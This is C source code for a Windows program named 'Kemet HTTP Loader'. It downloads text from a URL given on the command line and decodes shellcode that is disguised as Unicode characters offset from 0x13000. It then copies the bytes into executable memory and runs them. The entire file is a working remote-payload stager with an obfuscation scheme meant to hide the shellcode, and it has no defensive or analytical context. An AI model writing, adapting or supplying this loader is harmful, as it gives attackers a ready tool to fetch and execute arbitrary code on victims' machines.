#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <stdint.h>
#include <wininet.h>

// Tell the linker to connect to the WinINet library
#pragma comment(lib, "wininet.lib")

#define MAX_DOWNLOAD_SIZE (4 * 1024 * 1024) // 4MB, enough for most shellcode

// Downloads a file from a URL into a buffer
char* download_from_url(const char* url, size_t* content_size) {
    HINTERNET internet = InternetOpen("KemetLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!internet) return NULL;

    HINTERNET url_handle = InternetOpenUrl(internet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!url_handle) {
        InternetCloseHandle(internet);
        return NULL;
    }

    // Allocate a large buffer
    char* buffer = malloc(MAX_DOWNLOAD_SIZE);
    if (!buffer) {
        InternetCloseHandle(url_handle);
        InternetCloseHandle(internet);
        return NULL;
    }

    DWORD total_bytes_read = 0;
    DWORD bytes_read_this_time;

    // Read the file in chunks until it's done
    while (InternetReadFile(url_handle, buffer + total_bytes_read, 1024, &bytes_read_this_time) && bytes_read_this_time > 0) {
        total_bytes_read += bytes_read_this_time;
        // Prevent buffer overflow
        if (total_bytes_read >= MAX_DOWNLOAD_SIZE) break;
    }

    // Clean up internet handles
    InternetCloseHandle(url_handle);
    InternetCloseHandle(internet);

    // If we downloaded nothing, free the buffer and fail
    if (total_bytes_read == 0) {
        free(buffer);
        return NULL;
    }

    // Resize the buffer to the actual size of the content and add a null terminator
    char* final_buffer = realloc(buffer, total_bytes_read + 1);
    if (final_buffer) {
        final_buffer[total_bytes_read] = '\0'; // Make it a valid C string
    } else {
        // If realloc fails, the original buffer is still valid
        buffer[total_bytes_read] = '\0';
        final_buffer = buffer;
    }

    *content_size = total_bytes_read;
    return final_buffer;
}

// Decodes the special Unicode text into shellcode bytes
unsigned char* decode_content(const char* utf8_buffer, size_t* shellcode_len) {
    // Convert UTF-8 to wide characters
    size_t buffer_size = strlen(utf8_buffer);
    wchar_t* wide_chars = malloc((buffer_size + 1) * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, -1, wide_chars, buffer_size + 1);
    
    // Count how many bytes we will get
    size_t count = 0;
    for (int i = 0; wide_chars[i] != 0; i++) {
        if (wide_chars[i] >= 0xD800 && wide_chars[i] <= 0xDBFF) i++; // Skip surrogate pair part
        count++;
    }
    
    // Allocate memory for the final shellcode
    unsigned char* shellcode = malloc(count);
    const int UNICODE_BASE = 0x13000;
    int shellcode_index = 0;
    
    // Convert each character to a shellcode byte
    for (int i = 0; wide_chars[i] != 0; i++) {
        uint32_t unicode_value;
        if (wide_chars[i] >= 0xD800 && wide_chars[i] <= 0xDBFF) {
            // Handle surrogate pairs
            uint32_t high = wide_chars[i] & 0x3FF;
            i++;
            uint32_t low = wide_chars[i] & 0x3FF;
            unicode_value = 0x10000 + (high << 10) + low;
        } else {
            unicode_value = wide_chars[i];
        }
        
        shellcode[shellcode_index] = (unsigned char)(unicode_value - UNICODE_BASE);
        shellcode_index++;
    }
    
    free(wide_chars);
    *shellcode_len = count;
    return shellcode;
}

int main(int argc, char* argv[]) {
    printf("=== Kemet HTTP Loader ===\n");
    
    if (argc < 2) {
        printf("[!] Usage: %s <URL>\n", argv[0]);
        return 1;
    }
    
    printf("[*] Downloading from: %s\n", argv[1]);
    
    // Stage 1: Download
    size_t content_size = 0;
    char* utf8_buffer = download_from_url(argv[1], &content_size);
    if (!utf8_buffer) {
        printf("[!] Failed to download file.\n");
        return 1;
    }
    printf("[*] Downloaded %zu bytes\n", content_size);
    
    // Stage 2: Decode
    size_t len;
    unsigned char* shellcode = decode_content(utf8_buffer, &len);
    free(utf8_buffer); // We don't need the downloaded text anymore
    
    if (!shellcode) {
        printf("[!] Failed to decode content.\n");
        return 1;
    }
    
    printf("[*] Decoded %zu bytes of shellcode.\n", len);
    
    // Stage 3: Execute
    void* exec_mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, shellcode, len);
    
    DWORD old_protect;
    VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &old_protect);
    
    printf("[*] Press Enter to execute...");
    getchar();
    
    void (*shellcode_func)() = (void (*)())exec_mem;
    shellcode_func();
    
    // Clean up (will likely not be reached)
    free(shellcode);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}